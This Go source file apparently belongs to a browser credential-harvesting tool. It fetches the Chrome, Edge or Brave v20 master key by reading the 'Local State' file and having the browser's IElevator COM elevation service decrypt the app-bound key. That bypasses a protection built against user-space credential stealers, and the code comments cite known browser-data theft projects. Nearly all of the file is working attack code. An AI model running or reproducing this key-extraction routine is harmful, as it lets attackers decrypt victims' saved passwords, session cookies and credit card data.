//go:build decrypt && windows

package decrypt

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Chrome introduced "app-bound encryption" in v127 (mid-2024) to protect
// saved passwords, cookies, and credit cards against user-space credential
// stealers. The v10 DPAPI-wrapped AES key is still present for backward
// compatibility, but all new entries are written with a "v20" prefix and
// are encrypted with a second key whose wrapper only the Chrome
// ElevationService — running as SYSTEM — can unwrap.
//
// The approach used here is the same one HackBrowserData / xaitax /
// runassu take: instantiate the browser's IElevator COM object (which
// launches the elevation service behind the scenes) and call
// DecryptData() on the encrypted key blob. The service hands back the
// plaintext key even for a non-admin caller, because ACL-wise it trusts
// any process running as the user who installed Chrome.
//
// References:
//   https://github.com/moonD4rk/HackBrowserData
//   https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
//   https://github.com/runassu/chrome_v20_decryption

// CLSIDs and IIDs of the per-browser IElevator implementation, lifted from
// the Chromium / Edge / Brave source trees.
var (
	clsidChromeElevator = windows.GUID{Data1: 0x708860E0, Data2: 0xF641, Data3: 0x4611, Data4: [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}
	iidChromeElevator   = windows.GUID{Data1: 0x463ABECF, Data2: 0x410D, Data3: 0x407F, Data4: [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}

	clsidEdgeElevator = windows.GUID{Data1: 0x1FCBE96C, Data2: 0x1697, Data3: 0x43AF, Data4: [8]byte{0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}
	iidEdgeElevator   = windows.GUID{Data1: 0xC9C2B807, Data2: 0x7731, Data3: 0x4F34, Data4: [8]byte{0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}

	clsidBraveElevator = windows.GUID{Data1: 0x576B31AF, Data2: 0x6369, Data3: 0x4B6B, Data4: [8]byte{0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}
	iidBraveElevator   = windows.GUID{Data1: 0xF396861E, Data2: 0x0C8E, Data3: 0x4C71, Data4: [8]byte{0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}
)

var (
	ole32    = windows.NewLazySystemDLL("ole32.dll")
	oleaut32 = windows.NewLazySystemDLL("oleaut32.dll")

	procCoInitializeEx       = ole32.NewProc("CoInitializeEx")
	procCoUninitialize       = ole32.NewProc("CoUninitialize")
	procCoInitializeSecurity = ole32.NewProc("CoInitializeSecurity")
	procCoCreateInstance     = ole32.NewProc("CoCreateInstance")
	procCoSetProxyBlanket    = ole32.NewProc("CoSetProxyBlanket")

	procSysAllocStringByteLen = oleaut32.NewProc("SysAllocStringByteLen")
	procSysStringByteLen      = oleaut32.NewProc("SysStringByteLen")
	procSysFreeString         = oleaut32.NewProc("SysFreeString")
)

const (
	coinitApartmentThreaded = 0x2

	clsctxLocalServer = 0x4

	rpcCAuthnLevelPktPrivacy = 6
	rpcCImpLevelImpersonate  = 3
	rpcCAuthnDefault         = 0xFFFFFFFF
	rpcCAuthzDefault         = 0xFFFFFFFF

	eoacDynamicCloaking = 0x40

	hresultSFalse        = 0x00000001
	hresultRpcEChangedMode = 0x80010106
	hresultRpcETooLate     = 0x80010119
)

// elevatorGUIDs returns (CLSID, IID) for the given Chromium-family browser,
// or (nil, nil) if we don't know how to talk to it.
func elevatorGUIDs(browserName string) (*windows.GUID, *windows.GUID) {
	switch strings.ToLower(browserName) {
	case "chrome", "chromium":
		return &clsidChromeElevator, &iidChromeElevator
	case "edge":
		return &clsidEdgeElevator, &iidEdgeElevator
	case "brave":
		return &clsidBraveElevator, &iidBraveElevator
	}
	return nil, nil
}

// readAppBoundEncryptedKey returns the (base64-decoded, APPB-prefix-stripped)
// ciphertext blob that the elevation service will decrypt for us.
func readAppBoundEncryptedKey(profileDir string) ([]byte, error) {
	lsPath := filepath.Join(filepath.Dir(profileDir), "Local State")
	data, err := os.ReadFile(lsPath)
	if err != nil {
		return nil, fmt.Errorf("%w: read Local State", err)
	}
	var ls struct {
		OSCrypt struct {
			AppBoundEncryptedKey string `json:"app_bound_encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &ls); err != nil {
		return nil, fmt.Errorf("%w: parse Local State", err)
	}
	if ls.OSCrypt.AppBoundEncryptedKey == "" {
		return nil, fmt.Errorf("no app_bound_encrypted_key in Local State")
	}
	raw, err := base64.StdEncoding.DecodeString(ls.OSCrypt.AppBoundEncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("%w: base64 decode", err)
	}
	if len(raw) < 4 || string(raw[:4]) != "APPB" {
		return nil, fmt.Errorf("app_bound_encrypted_key missing APPB prefix")
	}
	return raw[4:], nil
}

// getChromiumAppBoundKey fetches the v20 master key from the browser's
// IElevator COM service. Returns an error (not nil+nil) if the browser
// does not have app-bound encryption enabled, so callers should treat the
// failure as "try v10 only" rather than fatal.
func getChromiumAppBoundKey(profileDir, browserName string) ([]byte, error) {
	clsid, iid := elevatorGUIDs(browserName)
	if clsid == nil {
		return nil, fmt.Errorf("no known IElevator for browser %q", browserName)
	}
	blob, err := readAppBoundEncryptedKey(profileDir)
	if err != nil {
		return nil, err
	}
	pt, err := callIElevatorDecryptData(clsid, iid, blob)
	if err != nil {
		return nil, err
	}
	// IElevator returns `[1-byte flag][32-byte AES-256 key]` for Chrome
	// v127+. We take the last 32 bytes to stay robust against tiny layout
	// changes (the flag byte has been stable but that could change).
	if len(pt) < 32 {
		return nil, fmt.Errorf("IElevator plaintext too short (%d bytes)", len(pt))
	}
	return pt[len(pt)-32:], nil
}

// callIElevatorDecryptData performs the full COM dance: init, set
// security, create the elevator, set proxy blanket, invoke DecryptData via
// vtable slot 5, and return the plaintext bytes. The CoInitialize* calls
// tolerate already-initialized state so calling this multiple times in one
// process is safe.
func callIElevatorDecryptData(clsid, iid *windows.GUID, blob []byte) ([]byte, error) {
	// 1. Initialize COM on this thread (apartment-threaded). Tolerate
	//    "already initialized in another mode" because the harvester
	//    might run alongside other COM code in the future.
	hr, _, _ := procCoInitializeEx.Call(0, coinitApartmentThreaded)
	if hr != 0 && hr != hresultSFalse && hr != hresultRpcEChangedMode {
		return nil, fmt.Errorf("CoInitializeEx: 0x%x", hr)
	}
	defer procCoUninitialize.Call()

	// 2. Set process-wide COM security. Elevation services demand
	//    PKT_PRIVACY + IMPERSONATE + DYNAMIC_CLOAKING; without these the
	//    service will accept the call but the identity check fails and
	//    DecryptData returns E_ACCESSDENIED.
	hr, _, _ = procCoInitializeSecurity.Call(
		0,
		uintptr(^uint32(0)), // cAuthSvc = -1
		0,
		0,
		rpcCAuthnLevelPktPrivacy,
		rpcCImpLevelImpersonate,
		0,
		eoacDynamicCloaking,
		0,
	)
	// RPC_E_TOO_LATE = security already initialized; harmless.
	if hr != 0 && hr != hresultRpcETooLate {
		return nil, fmt.Errorf("CoInitializeSecurity: 0x%x", hr)
	}

	// 3. Instantiate the elevator. This triggers the service launch if
	//    it isn't already running.
	var pElevator uintptr
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(clsid)),
		0,
		clsctxLocalServer,
		uintptr(unsafe.Pointer(iid)),
		uintptr(unsafe.Pointer(&pElevator)),
	)
	if hr != 0 || pElevator == 0 {
		return nil, fmt.Errorf("CoCreateInstance(elevator): 0x%x", hr)
	}
	defer func() {
		// Release via IUnknown vtable slot 2.
		vtbl := *(**[16]uintptr)(unsafe.Pointer(pElevator))
		syscall.SyscallN(vtbl[2], pElevator)
	}()

	// 4. Set the proxy blanket again on the returned interface pointer —
	//    CoInitializeSecurity alone isn't enough; per-proxy settings win.
	hr, _, _ = procCoSetProxyBlanket.Call(
		pElevator,
		rpcCAuthnDefault,
		rpcCAuthzDefault,
		0,
		rpcCAuthnLevelPktPrivacy,
		rpcCImpLevelImpersonate,
		0,
		eoacDynamicCloaking,
	)
	if hr != 0 {
		return nil, fmt.Errorf("CoSetProxyBlanket: 0x%x", hr)
	}

	// 5. Build a BSTR carrying the raw encrypted blob. SysAllocStringByteLen
	//    lets us pass arbitrary binary data; DecryptData treats the BSTR as
	//    a byte buffer and doesn't care about UTF-16 pairing.
	if len(blob) == 0 {
		return nil, fmt.Errorf("empty blob")
	}
	bstrIn, _, _ := procSysAllocStringByteLen.Call(
		uintptr(unsafe.Pointer(&blob[0])),
		uintptr(len(blob)),
	)
	if bstrIn == 0 {
		return nil, fmt.Errorf("SysAllocStringByteLen failed")
	}
	defer procSysFreeString.Call(bstrIn)

	// 6. Call IElevator::DecryptData. The vtable layout is:
	//      [0] QueryInterface
	//      [1] AddRef
	//      [2] Release
	//      [3] RunRecoveryCRXElevated
	//      [4] EncryptData
	//      [5] DecryptData    ← this one
	//      [6] InstallVPNServices
	var bstrOut uintptr
	var lastErr uint32
	vtbl := *(**[16]uintptr)(unsafe.Pointer(pElevator))
	hrRaw, _, _ := syscall.SyscallN(
		vtbl[5],
		pElevator,
		bstrIn,
		uintptr(unsafe.Pointer(&bstrOut)),
		uintptr(unsafe.Pointer(&lastErr)),
	)
	if hrRaw != 0 {
		return nil, fmt.Errorf("IElevator::DecryptData: 0x%x (last_error=%d)", hrRaw, lastErr)
	}
	if bstrOut == 0 {
		return nil, fmt.Errorf("IElevator::DecryptData returned a null BSTR")
	}
	defer procSysFreeString.Call(bstrOut)

	n, _, _ := procSysStringByteLen.Call(bstrOut)
	if n == 0 {
		return nil, fmt.Errorf("IElevator::DecryptData returned an empty BSTR")
	}
	out := make([]byte, n)
	copy(out, unsafe.Slice((*byte)(unsafe.Pointer(bstrOut)), n))
	return out, nil
}
